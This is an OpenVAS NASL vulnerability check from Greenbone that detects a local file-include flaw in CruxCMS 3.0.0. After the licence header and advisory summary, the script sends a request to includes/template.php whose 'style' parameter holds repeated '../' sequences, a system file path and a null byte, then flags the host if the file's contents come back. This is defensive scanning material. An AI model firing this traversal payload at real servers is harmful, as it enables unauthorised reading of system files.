###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cruxcms_45594.nasl 13 2013-10-27 12:16:33Z jan $
#
# CruxCMS Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "CruxCMS is prone to multiple input-validation vulnerabilities,
including multiple security-bypass issues, multiple arbitrary-file-
upload issues, multiple SQL-injection issues, a local file-include
issue, a cross-site-scripting issue and multiple information-
disclosure issues. These issues occur because the application fails to
properly sanitize user-supplied input.

Exploiting these issues may allow an unauthorized user to view files
and execute local scripts, execute arbitrary script code, bypass
certain security restrictions, access or modify data, exploit latent
vulnerabilities in the underlying database, gain administrative
access, steal cookie-based authentication credentials, and launch
other attacks.

CruxCMS 3.0.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103015);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-01-05 15:07:33 +0100 (Wed, 05 Jan 2011)");
 script_bugtraq_id(45594);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("CruxCMS Multiple Input Validation Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45594");
 script_xref(name : "URL" , value : "http://www.cruxsoftware.co.uk/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/515444");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if installed CruxCMS is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_crux_products_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"CruxCMS"))exit(0);
files = traversal_files();

foreach file (keys(files)) {
   
  url = string(dir,"/includes/template.php?style=",crap(data:"../",length:3*15),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);
